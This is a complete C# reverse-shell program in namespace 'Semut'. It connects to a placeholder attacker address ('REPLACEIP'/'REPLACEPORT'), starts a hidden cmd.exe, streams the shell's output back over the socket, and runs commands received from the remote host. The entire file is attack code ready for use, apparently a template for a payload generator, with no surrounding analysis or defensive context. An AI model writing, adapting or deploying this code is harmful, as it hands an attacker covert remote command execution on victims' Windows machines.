using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace Semut
{
    public class Program
    {
        public static StreamWriter streamWriter;

        public static void Main(string[] args)
        {
            try
            {
                using (TcpClient client = new TcpClient("REPLACEIP", REPLACEPORT))
                {
                    using (NetworkStream stream = client.GetStream())
                    {

                            using (Process proc = new Process())
                            {
                                proc.StartInfo.FileName = "cmd.exe";
                                proc.StartInfo.CreateNoWindow = true;
                                proc.StartInfo.UseShellExecute = false;
                                proc.StartInfo.RedirectStandardOutput = true;
                                proc.StartInfo.RedirectStandardInput = true;
                                proc.StartInfo.RedirectStandardError = true;
                                proc.OutputDataReceived += (sender, a) => {
                                    if(stream.CanWrite)
                                    {
                                        stream.Write(Encoding.UTF8.GetBytes("\n" + a.Data), 0, a.Data.Length + 1);
                                        stream.Flush();
                                    }
                                };
                                proc.Start();
                                proc.BeginOutputReadLine();

                                //http://www.java2s.com/Tutorial/CSharp/0580__Network/UseNetworkStreamtoreadandwritetoaserver.htm
                                while (true)
                                {
                                    byte[] data = new byte[1024];
                                    int receivedDataLength = stream.Read(data, 0, data.Length);
                                    string stringData = Encoding.ASCII.GetString(data, 0, receivedDataLength);
                                    proc.StandardInput.WriteLine(stringData);
                                }
                            }
                        //}
                    }
                }
            }
            catch
            {
                Console.WriteLine("Connection Terminated");
            }
            
        }
    }
}
